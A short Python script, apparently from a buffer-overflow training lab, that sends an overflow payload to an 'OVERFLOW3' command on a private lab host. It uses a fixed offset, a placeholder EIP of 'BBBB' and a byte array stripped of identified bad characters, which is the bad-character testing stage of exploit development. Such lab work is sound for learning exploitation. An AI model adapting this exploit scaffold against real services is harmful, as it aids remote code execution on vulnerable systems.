import socket, struct


host, port = '10.10.100.108', 1337

command = b'OVERFLOW3 '

new_eip = b'BBBB'
offset = 1274
length = 1300
all_chars = bytearray(range(1,256))
bad_chars = [
b'\x11',
b'\x40',
b'\x5f',
b'\xb8',
b'\xee'
]
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

payload = b''.join([

command,
b'A' * offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars)),


])




with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
